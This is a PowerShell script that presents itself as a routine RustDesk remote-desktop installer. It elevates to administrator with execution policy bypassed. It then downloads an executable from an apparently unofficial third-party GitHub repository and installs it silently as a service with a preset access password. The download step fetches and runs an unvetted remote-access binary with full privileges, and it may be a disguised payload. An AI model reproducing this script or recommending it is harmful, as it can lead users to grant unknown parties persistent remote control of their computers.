$ErrorActionPreference = 'Stop'

# Assign the value random password to the password variable
$rustdesk_pw = (-join ((65..90) + (97..122) + (48..57) | Get-Random -Count 12 | % {[char]$_}))

# Get your config string from your Web portal and Fill Below
$rustdesk_cfg = "YOUR CONFIG STRING RIGHT HERE"

################################### Please Do Not Edit Below This Line #########################################

# Function to check if the script is running as administrator
function Test-Administrator {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# Run as administrator and stays in the current directory
if (-Not (Test-Administrator)) {
    if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
        Start-Process PowerShell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"cd '$pwd'; & '$PSCommandPath';`""
        Exit
    }
}

# Check if RustDesk is already installed and is the latest version
try {
    $rdver = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\RustDesk\").Version
    if ($rdver -eq "1.2.7-2") {
        Write-Output "RustDesk $rdver is the newest version"
        exit
    }
} catch {
    Write-Output "RustDesk not found or version check failed."
}

# Create Temp directory if it doesn't exist
if (-Not (Test-Path C:\Temp)) {
    New-Item -ItemType Directory -Force -Path C:\Temp | Out-Null
}

cd C:\Temp

# Download RustDesk
Write-Output "Downloading RustDesk..."
try {
powershell Invoke-WebRequest "https://github.com/Pofig1sT161/rustdesk1.2.7/releases/download/nightly/rustdesk-1.2.7-x86_64.exe" -OutFile "rustdesk.exe"
} catch {
    Write-Output "Error: Failed to download RustDesk."
    Pause
    exit
}

# Install RustDesk silently with timeout
Write-Output "Installing RustDesk..."
try {
    $installProcess = Start-Process .\rustdesk.exe -ArgumentList "--silent-install" -PassThru -NoNewWindow
    $installProcess.WaitForExit(60000)  # Wait for 60 seconds
    if (-Not $installProcess.HasExited) {
        Write-Output "Error: RustDesk installation timed out."
        $installProcess.Kill()
        Pause
        exit
    }
} catch {
    Write-Output "Error: RustDesk installation failed."
    Pause
    exit
}

# Check if RustDesk service is installed
$ServiceName = 'RustDesk'
$arrService = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue

if ($arrService -eq $null) {
    Write-Output "Installing RustDesk service..."
    cd $env:ProgramFiles\RustDesk
    try {
        Start-Process .\rustdesk.exe --install-service -Wait -NoNewWindow -PassThru
        Start-Sleep -Seconds 20
    } catch {
        Write-Output "Error: Failed to install RustDesk service."
        Pause
        exit
    }
}

# Ensure the RustDesk service is running
$arrService = Get-Service -Name $ServiceName
while ($arrService.Status -ne 'Running') {
    Start-Service $ServiceName
    Start-Sleep -Seconds 5
    $arrService.Refresh()
}

# Get RustDesk ID
cd $env:ProgramFiles\RustDesk
try {
    $rustdesk_id = & .\RustDesk.exe --get-id | Out-String
    $rustdesk_id = $rustdesk_id.Trim()
} catch {
    Write-Output "Error: Failed to get RustDesk ID."
    Pause
    exit
}

# Apply RustDesk configuration
Write-Output "Configuring RustDesk..."
try {
    & .\RustDesk.exe --config $rustdesk_cfg
} catch {
    Write-Output "Error: Failed to configure RustDesk."
    Pause
    exit
}

# Set RustDesk password
Write-Output "Setting RustDesk password..."
try {
    & .\RustDesk.exe --password $rustdesk_pw
} catch {
    Write-Output "Error: Failed to set RustDesk password."
    Pause
    exit
}

# Display RustDesk ID and Password
Write-Output "..............................................."
Write-Output "RustDesk ID: $rustdesk_id"
Write-Output "Password: $rustdesk_pw"
Write-Output "..............................................."

# Copy ID and password to clipboard
try {
    $clipboardContent = "RustDesk ID: $rustdesk_id`nPassword: $rustdesk_pw"
    $clipboardContent | Set-Clipboard
    Write-Output "The RustDesk ID and password have been copied to the clipboard."
} catch {
    Write-Output "Error: Failed to copy RustDesk ID and password to the clipboard."
}

# Inform the user and wait for key press to close
Write-Output "Press any key to close this window."
$x = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
